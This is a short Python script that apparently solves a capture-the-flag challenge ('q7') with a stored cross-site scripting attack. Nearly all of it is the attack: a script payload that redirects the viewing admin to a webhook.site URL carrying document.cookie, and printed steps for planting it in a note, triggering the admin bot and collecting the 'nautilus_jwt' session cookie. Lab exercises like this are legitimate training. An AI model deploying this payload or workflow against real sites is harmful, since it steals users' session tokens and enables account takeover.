import requests

# INSTRUCTIONS:
# 1. Go to https://webhook.site and copy your "Unique URL".
# 2. Paste it in the WEBHOOK_URL variable below.
# 3. Run this script to submit the payload.

WEBHOOK_URL = "REPLACE_WITH_YOUR_WEBHOOK_URL"

def solve_q7():
    base_url = "https://69eba7f3f6ade36f2f97629b-8000.gateway.cityinthe.cloud"
    
    # This payload redirects the admin to your webhook with their cookie in the query string
    payload = f"<script>location='{WEBHOOK_URL}/?c='+document.cookie</script>"
    
    print(f"[*] Payload: {payload}")
    print("[*] You need to submit this payload as a 'Note' or 'Message' that the admin will view.")
    print("[*] After submitting, find the 'Report to Admin' button on the page.")
    
    # Note: Automation of the submission depends on the exact form field names (e.g., 'content', 'title')
    print("[!] Manual Step: Submit the payload above and click 'Report' to trigger the bot.")
    print("[!] Then, check your Webhook.site dashboard for a request with the 'nautilus_jwt' cookie.")

if __name__ == "__main__":
    solve_q7()
